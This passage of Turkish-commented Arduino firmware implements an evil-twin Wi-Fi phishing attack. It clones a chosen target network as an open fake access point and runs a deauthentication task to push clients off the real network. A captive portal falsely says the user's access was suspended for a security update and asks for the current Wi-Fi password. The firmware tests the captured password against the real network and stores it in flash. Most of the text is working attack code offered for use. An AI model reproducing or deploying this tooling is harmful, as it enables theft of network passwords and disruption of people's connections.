  client.print("<p class='sub'>Güvenlik standartları güncellendiği için ağ erişiminiz geçici olarak askıya alınmıştır. İnternete tekrar bağlanabilmek için lütfen mevcut şifrenizi doğrulayınız.</p>");

  // Animasyon kutusu — form'un üstünde, doğru konumda
  // Sunucu CS_RUNNING ise direkt göster; değilse gizli başlat, JS butona basınca açar
  if (conn_status == CS_RUNNING) {
      client.print("<div id='sbox' class='status-box wait'><span class='spinner'></span>Ağ kimliği doğrulanıyor, lütfen bekleyiniz...</div>");
  } else if (show_result) {
    if (conn_result == "ok") client.print("<div class='status-box ok'>&#10003; Doğrulama başarılı. İnternet erişiminiz sağlanıyor...</div>");
    else if (conn_result == "fail") client.print("<div class='status-box err'>&#10007; Girdiğiniz Wi-Fi şifresi hatalı. Lütfen tekrar deneyiniz.</div>");
  } else {
    client.print("<div id='sbox' style='display:none;' class='status-box wait'><span class='spinner'></span>Ağ kimliği doğrulanıyor, lütfen bekleyiniz...</div>");
  }

  client.print("<div class='conn-status'>Erişim Sağlanacak Ağ:<br><b style='font-size:1.3rem; display:block; margin-top:8px; color:#0056b3;'>"); 
  client.print(target_ssid);
  client.print("</b></div>");
  
  client.print("<form method='POST' action='/connect' id='cf' onsubmit='handleSubmit()'>");
  client.print("<div class='pass-wrap'><label for='pass'>Wi-Fi Parolası</label>");
  client.print("<input type='password' id='pass' name='pass' placeholder='Mevcut şifrenizi giriniz...' autocomplete='off' required>");
  client.print("<div class='show-pass' onclick=\"var p=document.getElementById('pass');p.type=p.type=='password'?'text':'password'\">&#128065; Şifreyi Göster</div></div>");
  client.print("<button type='submit' id='sbtn'>İnternete Bağlan</button></form>");

  client.print("<script>");
  client.print("function handleSubmit(){");
  client.print("  var box=document.getElementById('sbox');");
  client.print("  var btn=document.getElementById('sbtn');");
  client.print("  if(box){ box.style.display='block'; }");
  client.print("  if(btn){ btn.disabled=true; btn.style.opacity='0.6'; }");
  client.print("}");
  if (conn_status == CS_RUNNING) {
      client.print("function tryR(){");
      client.print("  var t=new Date().getTime();");
      client.print("  fetch('/?t='+t,{cache:'no-store',signal:AbortSignal.timeout(4000)})");
      client.print("    .then(function(r){if(r.ok){window.location.href='/?t='+t;}else{setTimeout(tryR,2000);}})");
      client.print("    .catch(function(){setTimeout(tryR,2000);});");
      client.print("}");
      client.print("setTimeout(tryR,3000);");
  }
  client.print("</script>");
  
  client.print("<div class='footer'>Güvenli Bağlantı Yöneticisi &copy; 2026</div></div></body></html>");
}

// ─── HTTP İŞLEYİCİSİ ─────────────────────────────────────────────────────────
void handleClient(WiFiClient &client) {
  // ── BULK OKUMA: char-by-char yerine tampon ile hızlı okuma ──
  static char hbuf[896];
  int total = 0;
  unsigned long timeout = millis() + 1200;

  while (client.connected() && millis() < timeout && total < (int)sizeof(hbuf) - 1) {
    int avail = client.available();
    if (avail > 0) {
      int toRead = avail;
      if (toRead > (int)sizeof(hbuf) - 1 - total) toRead = (int)sizeof(hbuf) - 1 - total;
      int n = client.read((uint8_t*)hbuf + total, toRead);
      if (n > 0) {
        total += n;
        hbuf[total] = '\0';
        if (strstr(hbuf, "\r\n\r\n")) break;
      }
    } else {
      delayMicroseconds(500);
    }
  }
  if (total == 0) return;
  hbuf[total] = '\0';

  // ── ERKEN ÇIKIŞ: Captive portal tespiti — tam parse bekleme ──
  // İlk satırdan path'i al
  char *sp1 = strchr(hbuf, ' ');
  char *sp2 = sp1 ? strchr(sp1 + 1, ' ') : NULL;
  char rawpath[128] = "/";
  if (sp1 && sp2 && (sp2 - sp1 - 1) < (int)sizeof(rawpath)) {
    int plen = sp2 - sp1 - 1;
    memcpy(rawpath, sp1 + 1, plen);
    rawpath[plen] = '\0';
    // Query string sil
    char *qm = strchr(rawpath, '?');
    if (qm) *qm = '\0';
  }

  // Host header'ını bul
  char hostbuf[64] = "";
  char *hi = strstr(hbuf, "\r\nHost: ");
  if (hi) {
    hi += 8;
    char *he = strstr(hi, "\r\n");
    if (he) {
      int hlen = he - hi; if (hlen >= (int)sizeof(hostbuf)) hlen = sizeof(hostbuf) - 1;
      memcpy(hostbuf, hi, hlen); hostbuf[hlen] = '\0';
      // Port numarasını sil
      char *col = strchr(hostbuf, ':'); if (col) *col = '\0';
    }
  }

  bool path_is_captive = strstr(rawpath, "hotspot-detect") != NULL
                      || strstr(rawpath, "generate_204")   != NULL
                      || strstr(rawpath, "redirect")       != NULL
                      || strstr(rawpath, "connecttest")    != NULL
                      || strstr(rawpath, "ncsi")           != NULL
                      || strstr(rawpath, "canonical")      != NULL
                      || strstr(rawpath, "success")        != NULL
                      || strstr(rawpath, "mobile/status")  != NULL
                      || strstr(rawpath, "library/test")   != NULL
                      || strstr(rawpath, "internet_check") != NULL
                      || strstr(rawpath, "wpad.dat")       != NULL;
  bool host_is_foreign = (hostbuf[0] != '\0' && strcmp(hostbuf, AP_IP_ADDR) != 0);

  if (path_is_captive || host_is_foreign) {
    client.print(buildRedirect());
    client.flush();
    return;
  }

  // Tam parse için String'e al (sadece non-captive istekler için)
  String request(hbuf);
  String path(rawpath);

  String body = ""; int content_len = 0;
  int cl_idx = request.indexOf("Content-Length: ");
  if (cl_idx != -1) {
    content_len = request.substring(cl_idx + 16, request.indexOf("\r\n", cl_idx)).toInt();
    if (content_len > 256) content_len = 256;
  }
  if (content_len > 0) {
    body.reserve(content_len); int br = 0; timeout = millis() + 800;
    while (br < content_len && millis() < timeout) {
      int av = client.available();
      if (av > 0) {
        int rd = (av < content_len - br) ? av : (content_len - br);
        for (int i = 0; i < rd; i++) body += (char)client.read();
        br += rd;
      } else delayMicroseconds(500);
    }
  }

  String hostHeader(hostbuf);

  if (!ap_switched) {
    if (request.startsWith("POST") && path == "/delete_cred") {
      memset(saved_ssid, 0, MAX_SSID_LEN);
      memset(saved_pass, 0, MAX_PASS_LEN);
      saveCredentials("", ""); 
      sendStartPage(client);   
      client.flush();
      return;
    }

    if (request.startsWith("POST") && path == "/rescan") {
      if (scan_status != SCAN_RUNNING) startScan();
      sendStartPage(client); 
      client.flush();
      return;
    }
    
    if (request.startsWith("POST") && path == "/start_ap") {
      String sel_ssid = parsePostParam(body, "ssid");
      if (sel_ssid.length() == 0) { sendStartPage(client); return; }
      
      strncpy(target_ssid, sel_ssid.c_str(), MAX_SSID_LEN - 1);
      target_ssid[MAX_SSID_LEN - 1] = '\0';
      target_channel = 6;
      target_enc = ENC_TYPE_CCMP;
      target_5g_channel = 0;
      memset(target_5g_bssid, 0, 6);
      
      if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
      for (auto &net : networks) {
        if (net.ssid == sel_ssid) {
          target_channel = net.channel;
          target_enc = net.enc;
          memcpy(target_bssid, net.bssid, 6);
          break;
        }
      }
      if (networks_mutex) xSemaphoreGive(networks_mutex);
      
      sendSwitchingPage(client);
      pending_ap_switch = true; 
      client.flush();
      return;
    }
    sendStartPage(client); 
    client.flush();
    return;
  }

  if (request.startsWith("POST") && path == "/connect") {
    if (conn_status == CS_RUNNING) { sendPortalPage(client, false); return; }
    String sel_pass = parsePostParam(body, "pass");
    
    deauth_active = false; 
    delay(300); 

    strncpy(pending_ssid, target_ssid, MAX_SSID_LEN - 1);
    pending_ssid[MAX_SSID_LEN - 1] = '\0';
    strncpy(pending_pass, sel_pass.c_str(), MAX_PASS_LEN - 1);
    pending_pass[MAX_PASS_LEN - 1] = '\0';
    pending_enc = target_enc;
    
    conn_result = "";
    startConnectTask();
    sendPortalPage(client, false); 
    client.flush();
    return;
  }

  sendPortalPage(client, conn_result.length() > 0);
  client.flush();
}

// ─── Setup ───────────────────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200); delay(500);
  Serial.println("\n[Boot] Cihaz Aciliyor... Tam Kapasite Max TX/RX Modu Aktif!");

  networks_mutex = xSemaphoreCreateMutex();
  
  FlashMemory.begin(FLASH_OFFSET, FLASH_BUF_SIZE);
  loadCredentials();
  
  LwIP_Init();
  wifi_on(RTW_MODE_STA_AP); delay(500);

  wifi_disable_powersave();

  wifi_start_ap((char *)AP_INITIAL_SSID, RTW_SECURITY_WPA2_AES_PSK, (char *)AP_INITIAL_PASS, strlen(AP_INITIAL_SSID), strlen(AP_INITIAL_PASS), 6);
  delay(500);

  ip4_addr_t ip, mask, gw;
  IP4_ADDR(&ip,   192, 168, 4, 1);
  IP4_ADDR(&mask, 255, 255, 255, 0);
  IP4_ADDR(&gw,   192, 168, 4, 1);
  netif_set_addr(&xnetif[1], &ip, &mask, &gw);
  netif_set_up(&xnetif[1]); netif_set_link_up(&xnetif[1]);
  
  dhcps_init(&xnetif[1]); delay(500);
  
  server.begin();
  dnsServer.setResolvedIP(192, 168, 4, 1);
  dnsServer.begin();
  
  startScan();
}

// ─── Loop ────────────────────────────────────────────────────────────────────
void loop() {
  if (pending_ap_switch) {
    pending_ap_switch = false;
    ap_switched = true;
    
    delay(1000); 
    Serial.println("\n[Switch] Dinamik Ag Gecisi Basliyor...");

    dnsServer.stop();
    delay(200);

    wifi_set_mode(RTW_MODE_STA);
    delay(1000);

    wifi_set_mode(RTW_MODE_STA_AP);
    delay(1000);

    Serial.print("[Switch] Yeni Sifresiz Ag Aciliyor: "); Serial.println(target_ssid);
    
    wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
    delay(1500);

    netif_set_up(&xnetif[1]); 
    netif_set_link_up(&xnetif[1]);
    delay(200);

    dnsServer.begin();

    Serial.println("[Switch] Islem Tamam! Baglanti Kilidi Cozuldu ve DNS Yonlendirmesi Aktif.");
    
    ap_running_channel = target_channel;
    deauth_active = true;
    xTaskCreate(deauthTask, "deauth_tsk", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
  }

  // === TARAMA SONUCU: HEDEF KANAL DEĞİŞTİ Mİ? + 5GHz KANAL TESPİTİ ===
  if (scan_status == SCAN_DONE) {
    if (ap_switched) {
      if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
      for (auto &net : networks) {
        // 2.4GHz ana kanal takibi
        if (memcmp(net.bssid, target_bssid, 6) == 0 && net.channel != target_channel) {
          Serial.print("[ChannelTrack] Hedef yeni kanalda tespit edildi: "); Serial.println(net.channel);
          target_channel = net.channel;
        }
        // 5GHz kardeş BSSID takibi — 2.4GHz gibi BSSID ile eşleştir
        if (net.channel >= 36 && isSisterBSSID(target_bssid, net.bssid)) {
          if (net.channel != target_5g_channel) {
            Serial.print("[5GHz] BSSID eslesme, kanal guncellendi: ");
            Serial.print(target_5g_channel); Serial.print(" -> "); Serial.println(net.channel);
          }
          target_5g_channel = net.channel;
          memcpy(target_5g_bssid, net.bssid, 6);
        }
      }
      if (networks_mutex) xSemaphoreGive(networks_mutex);
    }
    scan_status = SCAN_IDLE;
  }

  // === SAHTE AP KANAL UYUMSUZLUGU: AP'Yİ YENİDEN BAŞLAT ===
  if (ap_switched && ap_running_channel != -1 && ap_running_channel != target_channel) {
    Serial.print("[APRestart] Kanal degisti, sahte AP yeniden baslatiliyor: "); Serial.println(target_channel);
    deauth_active = false;
    delay(300);
    dnsServer.stop();
    // Mod değişikliğine gerek yok — zaten RTW_MODE_STA_AP modundayız
    wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
    delay(1000);
    netif_set_up(&xnetif[1]);
    netif_set_link_up(&xnetif[1]);
    delay(200);
    dnsServer.begin();
    ap_running_channel = target_channel;
    deauth_active = true;
    xTaskCreate(deauthTask, "deauth_tsk", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
  }

  if (conn_status == CS_DONE_OK) {
    sta_connected = true;
    strncpy(saved_ssid, pending_ssid, MAX_SSID_LEN - 1);
    strncpy(saved_pass, pending_pass, MAX_PASS_LEN - 1);
    
    saveCredentials(saved_ssid, saved_pass);
    
    deauth_active = false;
    
    conn_result = "ok"; 
    conn_status = CS_IDLE;
    
    revert_time = millis() + 4000; 
    
  } else if (conn_status == CS_DONE_FAIL) {
    sta_connected = false; conn_result = "fail"; conn_status = CS_IDLE;
    
    if (ap_switched) {
      // Mod sıfırlaması YOK — zaten RTW_MODE_STA_AP modundayız.
      // wifi_connect() AP'yi biraz bozmuş olabilir, sadece AP'yi yeniden aç.
      deauth_active = false;
      delay(200);
      dnsServer.stop();
      wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
      delay(800);
      netif_set_up(&xnetif[1]);
      netif_set_link_up(&xnetif[1]);
      delay(100);
      dnsServer.begin();
      ap_running_channel = target_channel;
      Serial.println("[Fail] Sahte AP yeniden kuruldu (mod degistirilmedi).");
      deauth_active = true;
      xTaskCreate(deauthTask, "deauth_tsk", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
    }
  }

  if (revert_time > 0 && millis() > revert_time) {
    revert_time = 0;
    Serial.println("\n[Revert] Sifre dogrulandi, X agina donmek icin yeniden baslatiliyor...");
    Serial.flush(); 
    delay(200);     
    sys_reset();    
  }

  // Normal modda ve saldırı modunda periyodik tarama — kanal değişikliğini yakalamak için
  if (conn_status == CS_IDLE && scan_status == SCAN_IDLE && (millis() - last_scan_ms > RESCAN_INTERVAL_MS)) {
    startScan();
  }

  // === NETİF KEEPALIVE: AP arayüzü düşerse 5 saniyede bir yeniden ayağa kaldır ===
  if (ap_switched && (millis() - last_netif_check_ms > NETIF_CHECK_INTERVAL_MS)) {
    last_netif_check_ms = millis();
    if (!netif_is_up(&xnetif[1]) || !netif_is_link_up(&xnetif[1])) {
      Serial.println("[Keepalive] netif düşmüş, yeniden başlatılıyor...");
      netif_set_up(&xnetif[1]);
      netif_set_link_up(&xnetif[1]);
      dhcps_init(&xnetif[1]);
    }
    // Kanal kayması önlemi: radyoyu her zaman target_channel'a sabitle
    wifi_set_channel(target_channel);
  }

  WiFiClient client = server.available();
  if (client) {
    last_client_connect_ms = millis();
    portal_busy = true;
    handleClient(client);
    client.flush();
    client.stop();
    portal_busy = false;
  }
  
  delay(2); 
}
